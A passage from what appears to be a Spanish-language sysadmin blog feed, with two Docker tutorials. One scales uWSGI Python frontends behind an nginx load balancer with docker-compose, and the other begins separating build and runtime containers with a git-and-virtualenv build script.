&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;  server &lt;/span&gt;&lt;span class="nv"&gt;$BACKEND&lt;/span&gt;&lt;span class="s2"&gt;;&amp;quot;&lt;/span&gt;
&lt;span class="k"&gt;done&lt;/span&gt;
&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&amp;quot;\&lt;/span&gt;
&lt;span class="s2"&gt;}&lt;/span&gt;

&lt;span class="s2"&gt;server {&lt;/span&gt;
&lt;span class="s2"&gt;    listen 80;&lt;/span&gt;
&lt;span class="s2"&gt;    server_name _;&lt;/span&gt;

&lt;span class="s2"&gt;    location / {&lt;/span&gt;
&lt;span class="s2"&gt;        proxy_pass http://backend;&lt;/span&gt;
&lt;span class="s2"&gt;    }&lt;/span&gt;
&lt;span class="s2"&gt;}&lt;/span&gt;
&lt;span class="s2"&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
gerard@sirius:~/docker/composetest$ cat balancer/entrypoint.sh 
&lt;span class="c1"&gt;#!/bin/sh&lt;/span&gt;

./config.sh &amp;gt; /etc/nginx/conf.d/balancer
&lt;span class="nb"&gt;exec&lt;/span&gt; /usr/sbin/nginx -g &lt;span class="s2"&gt;&amp;quot;daemon off;&amp;quot;&lt;/span&gt;
gerard@sirius:~/docker/composetest$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;El frontend&lt;/h2&gt;
&lt;p&gt;Vamos a poner una aplicación básica en &lt;strong&gt;python&lt;/strong&gt;, que se va a servir con el servidor de aplicaciones &lt;strong&gt;uWSGI&lt;/strong&gt; y solo va a informar de su &lt;em&gt;hostname&lt;/em&gt;. Ahí pego su &lt;em&gt;Dockerfile&lt;/em&gt; y los otros ficheros auxiliares.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/docker/composetest$ cat frontend/Dockerfile 
FROM alpine:3.4
RUN apk add --no-cache uwsgi-python
COPY app.py app.ini /opt/app/
ENTRYPOINT &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;uwsgi&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;--plugin=python&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;/opt/app/app.ini&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
gerard@sirius:~/docker/composetest$ cat frontend/app.py 
import os

def app&lt;span class="o"&gt;(&lt;/span&gt;environ, start_response&lt;span class="o"&gt;)&lt;/span&gt;:
    start_response&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;200 OK&amp;#39;&lt;/span&gt;, &lt;span class="o"&gt;[(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Content-Type&amp;#39;&lt;/span&gt;, &lt;span class="s1"&gt;&amp;#39;text/plain&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)])&lt;/span&gt;
    yield os.uname&lt;span class="o"&gt;()[&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; + &lt;span class="s1"&gt;&amp;#39;\n&amp;#39;&lt;/span&gt;
gerard@sirius:~/docker/composetest$ cat frontend/app.ini 
&lt;span class="o"&gt;[&lt;/span&gt;uwsgi&lt;span class="o"&gt;]&lt;/span&gt;
http-socket &lt;span class="o"&gt;=&lt;/span&gt; :8080
&lt;span class="nv"&gt;chdir&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; /opt/app/
&lt;span class="nv"&gt;module&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; app:app
gerard@sirius:~/docker/composetest$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Declarando y levantando el servicio con docker-compose&lt;/h2&gt;
&lt;p&gt;Vamos a crear un fichero para gobernar las acciones de &lt;strong&gt;docker-compose&lt;/strong&gt;, siguiendo la &lt;a href="https://docs.docker.com/compose/compose-file/"&gt;documentación&lt;/a&gt;. La filosofía es muy simple; vamos a declarar como se construyen las imágenes, los puertos que publican y exponen, las variables de entorno necesarias y las dependencias entre las imágenes.&lt;/p&gt;
&lt;p&gt;Empezamos con la imagen que no tiene dependencias, que es el &lt;em&gt;frontend&lt;/em&gt;. Simplemente indicamos la carpeta que contiene el &lt;em&gt;Dockerfile&lt;/em&gt; (desde la carpeta actual, por ejemplo), y vamos a indicar el puerto que expone, tal como indica la configuración de &lt;strong&gt;uWSGI&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;El balanceador es un poco mas complejo; hay que indicar que no se puede levantar hasta que lo hagan los &lt;em&gt;frontends&lt;/em&gt;, porque sino, el &lt;strong&gt;nginx&lt;/strong&gt; no puede resolver sus nombres y acabaría inmediatamente. Hay que indicar que necesita acceso a los &lt;em&gt;frontends&lt;/em&gt; para comunicar con su puerto 8080, y que vamos a publicar el puerto 80 en el contenedor como el 8888 en nuestra máquina física. El último paso es declarar las variables de entorno que se van a pasar al contenedor cuando este se ejecute; en este caso declaramos los servidores contra los que hay que hacer balanceo.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;IMPORTANTE&lt;/strong&gt;: Cuando ejecutemos &lt;strong&gt;docker-compose&lt;/strong&gt;, va a levantar una instancia de cada imagen, pudiendo escalar a &lt;em&gt;posteriori&lt;/em&gt;. Como &lt;strong&gt;nginx&lt;/strong&gt; no va  levantar si no conoce alguno de los &lt;em&gt;hostnames&lt;/em&gt; contra los que balancea, vamos indicar solamente el primero.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/docker/composetest$ cat docker-compose.yml 
version: &lt;span class="s1"&gt;&amp;#39;2&amp;#39;&lt;/span&gt;
services:
  frontend:
    build: frontend
    expose:
      - &lt;span class="m"&gt;8080&lt;/span&gt;
  balancer:
    build: balancer
    depends_on:
      - frontend
    links:
      - frontend
    ports:
      - &lt;span class="s2"&gt;&amp;quot;8888:80&amp;quot;&lt;/span&gt;
    environment:
      - &lt;span class="nv"&gt;BACKENDS&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;composetest_frontend_1:8080
gerard@sirius:~/docker/composetest$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Con todo delcarado, solo nos falta levantar el servicio. Esto va a reconstruir todas las imágenes que crea necesarias, ya levantar los contenedores que no lo estén.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/docker/composetest$ docker-compose up -d
Creating network &lt;span class="s2"&gt;&amp;quot;composetest_default&amp;quot;&lt;/span&gt; with the default driver
Building frontend
Step &lt;span class="m"&gt;1&lt;/span&gt; : FROM alpine:3.4
 ---&amp;gt; 4e38e38c8ce0
Step &lt;span class="m"&gt;2&lt;/span&gt; : RUN apk add --no-cache uwsgi-python
 ---&amp;gt; Running in a57c36878d96
fetch http://dl-cdn.alpinelinux.org/alpine/v3.4/main/x86_64/APKINDEX.tar.gz
fetch http://dl-cdn.alpinelinux.org/alpine/v3.4/community/x86_64/APKINDEX.tar.gz
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;/14&lt;span class="o"&gt;)&lt;/span&gt; Installing mailcap &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;.1.44-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;/14&lt;span class="o"&gt;)&lt;/span&gt; Installing pcre &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;8&lt;/span&gt;.38-r1&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;3&lt;/span&gt;/14&lt;span class="o"&gt;)&lt;/span&gt; Installing uwsgi &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;.0.13-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;4&lt;/span&gt;/14&lt;span class="o"&gt;)&lt;/span&gt; Installing libbz2 &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;.0.6-r4&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;5&lt;/span&gt;/14&lt;span class="o"&gt;)&lt;/span&gt; Installing expat &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;.1.1-r1&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;6&lt;/span&gt;/14&lt;span class="o"&gt;)&lt;/span&gt; Installing libffi &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;3&lt;/span&gt;.2.1-r2&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;7&lt;/span&gt;/14&lt;span class="o"&gt;)&lt;/span&gt; Installing gdbm &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;.11-r1&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;8&lt;/span&gt;/14&lt;span class="o"&gt;)&lt;/span&gt; Installing ncurses-terminfo-base &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;6&lt;/span&gt;.0-r7&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;9&lt;/span&gt;/14&lt;span class="o"&gt;)&lt;/span&gt; Installing ncurses-terminfo &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;6&lt;/span&gt;.0-r7&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;10&lt;/span&gt;/14&lt;span class="o"&gt;)&lt;/span&gt; Installing ncurses-libs &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;6&lt;/span&gt;.0-r7&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;11&lt;/span&gt;/14&lt;span class="o"&gt;)&lt;/span&gt; Installing readline &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;6&lt;/span&gt;.3.008-r4&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;12&lt;/span&gt;/14&lt;span class="o"&gt;)&lt;/span&gt; Installing sqlite-libs &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;3&lt;/span&gt;.13.0-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;13&lt;/span&gt;/14&lt;span class="o"&gt;)&lt;/span&gt; Installing python &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;.7.12-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;14&lt;/span&gt;/14&lt;span class="o"&gt;)&lt;/span&gt; Installing uwsgi-python &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;.0.13-r0&lt;span class="o"&gt;)&lt;/span&gt;
Executing busybox-1.24.2-r9.trigger
OK: &lt;span class="m"&gt;53&lt;/span&gt; MiB in &lt;span class="m"&gt;25&lt;/span&gt; packages
 ---&amp;gt; 9749e8e317a7
Removing intermediate container a57c36878d96
Step &lt;span class="m"&gt;3&lt;/span&gt; : COPY app.py app.ini /opt/app/
 ---&amp;gt; 98c310db1c73
Removing intermediate container 141de70e5976
Step &lt;span class="m"&gt;4&lt;/span&gt; : ENTRYPOINT uwsgi --plugin&lt;span class="o"&gt;=&lt;/span&gt;python /opt/app/app.ini
 ---&amp;gt; Running in 7e5243bddee1
 ---&amp;gt; 27da8b15e8b4
Removing intermediate container 7e5243bddee1
Successfully built 27da8b15e8b4
Creating composetest_frontend_1
Building balancer
Step &lt;span class="m"&gt;1&lt;/span&gt; : FROM alpine:3.4
 ---&amp;gt; 4e38e38c8ce0
Step &lt;span class="m"&gt;2&lt;/span&gt; : RUN apk add --no-cache nginx &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt;     ln -s /dev/stdout /var/log/nginx/access.log &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt;     ln -s /dev/stderr /var/log/nginx/error.log &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt;     mkdir /run/nginx
 ---&amp;gt; Running in 5e7a6e24b1ea
fetch http://dl-cdn.alpinelinux.org/alpine/v3.4/main/x86_64/APKINDEX.tar.gz
fetch http://dl-cdn.alpinelinux.org/alpine/v3.4/community/x86_64/APKINDEX.tar.gz
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;/3&lt;span class="o"&gt;)&lt;/span&gt; Installing nginx-common &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;.10.1-r1&lt;span class="o"&gt;)&lt;/span&gt;
Executing nginx-common-1.10.1-r1.pre-install
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;/3&lt;span class="o"&gt;)&lt;/span&gt; Installing pcre &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;8&lt;/span&gt;.38-r1&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;3&lt;/span&gt;/3&lt;span class="o"&gt;)&lt;/span&gt; Installing nginx &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;.10.1-r1&lt;span class="o"&gt;)&lt;/span&gt;
Executing busybox-1.24.2-r9.trigger
OK: &lt;span class="m"&gt;6&lt;/span&gt; MiB in &lt;span class="m"&gt;14&lt;/span&gt; packages
 ---&amp;gt; b413d5ba8f3b
Removing intermediate container 5e7a6e24b1ea
Step &lt;span class="m"&gt;3&lt;/span&gt; : COPY nginx.conf /etc/nginx/
 ---&amp;gt; e7db8e5794db
Removing intermediate container e33eef86f883
Step &lt;span class="m"&gt;4&lt;/span&gt; : COPY config.sh entrypoint.sh /
 ---&amp;gt; e6fda1c75d22
Removing intermediate container 6cd5103894a9
Step &lt;span class="m"&gt;5&lt;/span&gt; : ENTRYPOINT /entrypoint.sh
 ---&amp;gt; Running in cd26bbeaa306
 ---&amp;gt; ff47baa82723
Removing intermediate container cd26bbeaa306
Successfully built ff47baa82723
Creating composetest_balancer_1
gerard@sirius:~/docker/composetest$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Podemos ver que ahora tenemos un solo contenedor por imagen declarada:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/docker/composetest$ docker-compose ps
         Name                       Command               State          Ports         
--------------------------------------------------------------------------------------
composetest_balancer_1   /entrypoint.sh                   Up      &lt;span class="m"&gt;0&lt;/span&gt;.0.0.0:8888-&amp;gt;80/tcp 
composetest_frontend_1   uwsgi --plugin&lt;span class="o"&gt;=&lt;/span&gt;python /opt ...   Up      &lt;span class="m"&gt;8080&lt;/span&gt;/tcp             
gerard@sirius:~/docker/composetest$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y si probamos nuestro servicio, vemos que funciona, aunque solo balancea contra un &lt;em&gt;frontend&lt;/em&gt;, que es lo que indicamos.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/docker/composetest$ curl http://localhost:8888/
9ae8f4367e2b
gerard@sirius:~/docker/composetest$ curl http://localhost:8888/
9ae8f4367e2b
gerard@sirius:~/docker/composetest$ curl http://localhost:8888/
9ae8f4367e2b
gerard@sirius:~/docker/composetest$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Escalando nuestro servicio&lt;/h2&gt;
&lt;p&gt;Escalar no es fácil; &lt;strong&gt;docker-compose&lt;/strong&gt; solo nos permite modificar el número de contenedores de cada tipo que están corriendo en un momento dado. Para que estos nuevos contenedores reciban peticiones, hay que modificar la configuración del balanceador.&lt;/p&gt;
&lt;p&gt;Empezaremos levantando otras 3 instancias de nuestro &lt;em&gt;frontend&lt;/em&gt;; indicando que queremos 4, &lt;strong&gt;docker-compose&lt;/strong&gt; va a levantar las 3 que faltan.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/docker/composetest$ docker-compose scale &lt;span class="nv"&gt;frontend&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;4&lt;/span&gt;
Creating and starting &lt;span class="m"&gt;2&lt;/span&gt; ... &lt;span class="k"&gt;done&lt;/span&gt;
Creating and starting &lt;span class="m"&gt;3&lt;/span&gt; ... &lt;span class="k"&gt;done&lt;/span&gt;
Creating and starting &lt;span class="m"&gt;4&lt;/span&gt; ... &lt;span class="k"&gt;done&lt;/span&gt;
gerard@sirius:~/docker/composetest$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Para la parte del balanceador, no nos queda mas remedio que reconstruirlo. Por suerte, nuestra imagen se configura con variables de entorno, de forma que &lt;strong&gt;docker-compose&lt;/strong&gt; solo va a levantar un contenedor nuevo, sin el proceso de reconstruir la imagen, que es innecesario.&lt;/p&gt;
&lt;p&gt;Vamos a modificar el &lt;em&gt;docker-compose.yml&lt;/em&gt;, para cambiar la variable de entorno &lt;em&gt;BACKENDS&lt;/em&gt;. Como ya tenemos 4 instancias funcionando, no hay problema por parte del &lt;strong&gt;nginx&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/docker/composetest$ cat docker-compose.yml 
version: &lt;span class="s1"&gt;&amp;#39;2&amp;#39;&lt;/span&gt;
services:
  frontend:
    build: frontend
    expose:
      - &lt;span class="m"&gt;8080&lt;/span&gt;
  balancer:
    build: balancer
    depends_on:
      - frontend
    links:
      - frontend
    ports:
      - &lt;span class="s2"&gt;&amp;quot;8888:80&amp;quot;&lt;/span&gt;
    environment:
      - &lt;span class="nv"&gt;BACKENDS&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;composetest_frontend_1:8080,composetest_frontend_2:8080,composetest_frontend_3:8080,composetest_frontend_4:8080
gerard@sirius:~/docker/composetest$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Levantamos el servicio de nuevo, y dejamos que &lt;strong&gt;docker-compose&lt;/strong&gt; aplique su buen criterio. Vemos que no va a hacer nada con los &lt;em&gt;frontends&lt;/em&gt; porque no han cambiado, y va a recrear el balanceador, con un tiempo mínimo.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/docker/composetest$ docker-compose up -d
composetest_frontend_4 is up-to-date
composetest_frontend_2 is up-to-date
composetest_frontend_3 is up-to-date
composetest_frontend_1 is up-to-date
Recreating composetest_balancer_1
gerard@sirius:~/docker/composetest$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Vemos que efectivamente hay nuestros 5 contenedores en marcha:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/docker/composetest$ docker-compose ps
         Name                       Command               State          Ports         
--------------------------------------------------------------------------------------
composetest_balancer_1   /entrypoint.sh                   Up      &lt;span class="m"&gt;0&lt;/span&gt;.0.0.0:8888-&amp;gt;80/tcp 
composetest_frontend_1   uwsgi --plugin&lt;span class="o"&gt;=&lt;/span&gt;python /opt ...   Up      &lt;span class="m"&gt;8080&lt;/span&gt;/tcp             
composetest_frontend_2   uwsgi --plugin&lt;span class="o"&gt;=&lt;/span&gt;python /opt ...   Up      &lt;span class="m"&gt;8080&lt;/span&gt;/tcp             
composetest_frontend_3   uwsgi --plugin&lt;span class="o"&gt;=&lt;/span&gt;python /opt ...   Up      &lt;span class="m"&gt;8080&lt;/span&gt;/tcp             
composetest_frontend_4   uwsgi --plugin&lt;span class="o"&gt;=&lt;/span&gt;python /opt ...   Up      &lt;span class="m"&gt;8080&lt;/span&gt;/tcp             
gerard@sirius:~/docker/composetest$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y solo nos queda admirar como funcionan las peticiones balanceadas, siguiendo el algoritmo &lt;em&gt;round robin&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/docker/composetest$ curl http://localhost:8888/
9ae8f4367e2b
gerard@sirius:~/docker/composetest$ curl http://localhost:8888/
7490edd50676
gerard@sirius:~/docker/composetest$ curl http://localhost:8888/
63e9d7476267
gerard@sirius:~/docker/composetest$ curl http://localhost:8888/
4b6b11513400
gerard@sirius:~/docker/composetest$ curl http://localhost:8888/
9ae8f4367e2b
gerard@sirius:~/docker/composetest$ curl http://localhost:8888/
7490edd50676
gerard@sirius:~/docker/composetest$ curl http://localhost:8888/
63e9d7476267
gerard@sirius:~/docker/composetest$ curl http://localhost:8888/
4b6b11513400
gerard@sirius:~/docker/composetest$ 
&lt;/pre&gt;&lt;/div&gt;</content><category term="docker"></category><category term="docker-compose"></category><category term="microservicios"></category></entry><entry><title>Separando el build y el runtime con contenedores Docker</title><link href="https://www.linuxsysadmin.ml/2016/10/separando-el-build-y-el-runtime-con-contenedores-docker.html" rel="alternate"></link><published>2016-10-10T08:00:00+02:00</published><updated>2016-10-10T08:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2016-10-10:/2016/10/separando-el-build-y-el-runtime-con-contenedores-docker.html</id><summary type="html">&lt;p&gt;Cuando montamos un contenedor &lt;strong&gt;Docker&lt;/strong&gt; para servir una aplicación cualquiera, solemos poner un montón de dependencias necesarias solamente para compilar el paquete o para empaquetar sus librerías. Esto supone un gasto innecesario en espacio y en tiempo de ejecución; usando contenedores desechables podemos agilizar este proceso de forma altamente considerable …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Cuando montamos un contenedor &lt;strong&gt;Docker&lt;/strong&gt; para servir una aplicación cualquiera, solemos poner un montón de dependencias necesarias solamente para compilar el paquete o para empaquetar sus librerías. Esto supone un gasto innecesario en espacio y en tiempo de ejecución; usando contenedores desechables podemos agilizar este proceso de forma altamente considerable.&lt;/p&gt;
&lt;p&gt;Para ello vamos a partir de una aplicación simplista hecha con &lt;strong&gt;python&lt;/strong&gt; que podemos encontrar en &lt;a href="https://github.com/Sirtea/autobuilder"&gt;https://github.com/Sirtea/autobuilder&lt;/a&gt;. La idea es que vamos a preparar las dependencias en un contenedor, para luego sacar lo justo y necesario para poner en un contenedor que disponga solamente de lo justo para el &lt;em&gt;runtime&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Para simplificar mas todavía, vamos a separar el código base del contenedor, de forma que este pueda ir cambiando modificando solamente un parámetro dado. Vamos a delegar la descarga y compilación del código base a un &lt;em&gt;script&lt;/em&gt;, que no cambie y que permita trabajar con las diferentes versiones de nuestra aplicación.&lt;/p&gt;
&lt;p&gt;Para que todo esto funcione, necesitamos seguir una cantidad mínima de reglas, que van a poderse cumplir independientemente del proyecto o del &lt;em&gt;framework&lt;/em&gt; usado.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;En la base del repositorio hay un &lt;em&gt;requirements.txt&lt;/em&gt; que nos va a indicar las librerías necesarias.&lt;/li&gt;
&lt;li&gt;La aplicación quedará alojada en una carpeta &lt;em&gt;app&lt;/em&gt;, el módulo con la aplicación se va a llamar &lt;em&gt;app&lt;/em&gt; (módulo o &lt;em&gt;package&lt;/em&gt;) y el &lt;em&gt;callable&lt;/em&gt; también se va a llamar &lt;em&gt;app&lt;/em&gt;.&lt;/li&gt;
&lt;li&gt;El &lt;em&gt;virtualenv&lt;/em&gt; se va aconstruir en &lt;em&gt;/app/env&lt;/em&gt;, para su uso futuro, en tiempo de &lt;em&gt;runtime&lt;/em&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Vamos a empezar construyendo una carpeta contenedora de las dos imágenes que vamos a usar, separadas a su vez por otro nivel de carpetas.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/docker/autobuilder$ tree
.
├── builder
│   ├── build.sh
│   └── Dockerfile
└── runner
    ├── app.ini
    └── Dockerfile

&lt;span class="m"&gt;2&lt;/span&gt; directories, &lt;span class="m"&gt;4&lt;/span&gt; files
gerard@sirius:~/docker/autobuilder$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;La imagen de build&lt;/h2&gt;
&lt;p&gt;La filosofía es muy simple: crearemos una imagen que tenga todas las dependencias necesarias para la construcción de la aplicación (en nuestro caso el &lt;em&gt;virtualenv&lt;/em&gt;), y vamos a poner un &lt;em&gt;script&lt;/em&gt; llamado &lt;em&gt;build.sh&lt;/em&gt; que se va a encargar de clonar un repositorio en &lt;a href="https://github.com/"&gt;GitHub&lt;/a&gt; y va a construir una refererencia tambien indicada mediante variables de entorno.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/docker/autobuilder$ cat builder/Dockerfile 
FROM alpine:3.4
RUN apk add --no-cache py-virtualenv git gcc musl-dev python-dev
COPY build.sh /
ENTRYPOINT &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;sh&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;build.sh&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
gerard@sirius:~/docker/autobuilder$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;El &lt;em&gt;script&lt;/em&gt; de &lt;em&gt;build&lt;/em&gt; va a depender bastante de como se prepara nuestra aplicación. En este caso va a clonar el repositorio en una carpeta &lt;em&gt;/build&lt;/em&gt;, y va a copiar la referencia solicitada en una carpeta &lt;em&gt;/app&lt;/em&gt;, que luego va a ser acompañada con un &lt;em&gt;virtualenv&lt;/em&gt;. Puesto que el &lt;em&gt;virtualenv&lt;/em&gt; es dependiente de la localización en el servidor, vamos a usar también &lt;em&gt;/app&lt;/em&gt; en la máquina de &lt;em&gt;runtime&lt;/em&gt;. En este paso es cuando hace falta usar la convención del fichero &lt;em&gt;requirements.txt&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/docker/autobuilder$ cat builder/build.sh 
&lt;span class="c1"&gt;#!/bin/sh&lt;/span&gt;

mkdir /app
git clone &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;REPO&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt; /build
&lt;span class="nb"&gt;cd&lt;/span&gt; /build
git archive &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;REF&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; tar xf - -C /app
virtualenv /app/env
/app/env/bin/pip install -r /app/requirements.txt
tar czf /shared/app.tar.gz -C / app
gerard@sirius:~/docker/autobuilder$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;La idea es que el producto acabado quede comprimido en la carpeta &lt;em&gt;/shared&lt;/em&gt;. Personalmente he utilizado un fichero &lt;em&gt;.tar.gz&lt;/em&gt;, pero se podría haber utilizado ficheros &lt;em&gt;.deb&lt;/em&gt;, &lt;em&gt;.rpm&lt;/em&gt; o lo que hiciera falta.&lt;/p&gt;
&lt;p&gt;Falta construir la imagen a partir de los ficheros dados:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/docker/autobuilder/builder$ docker build -t builder .
Sending build context to Docker daemon &lt;span class="m"&gt;3&lt;/span&gt;.072 kB
Step &lt;span class="m"&gt;1&lt;/span&gt; : FROM alpine:3.4
&lt;span class="m"&gt;3&lt;/span&gt;.4: Pulling from library/alpine
Digest: sha256:3dcdb92d7432d56604d4545cbd324b14e647b313626d99b889d0626de158f73a
Status: Downloaded newer image &lt;span class="k"&gt;for&lt;/span&gt; alpine:3.4
 ---&amp;gt; 4e38e38c8ce0
Step &lt;span class="m"&gt;2&lt;/span&gt; : RUN apk add --no-cache py-virtualenv git gcc musl-dev python-dev
 ---&amp;gt; Running in 36ab40f2fbc6
fetch http://dl-cdn.alpinelinux.org/alpine/v3.4/main/x86_64/APKINDEX.tar.gz
fetch http://dl-cdn.alpinelinux.org/alpine/v3.4/community/x86_64/APKINDEX.tar.gz
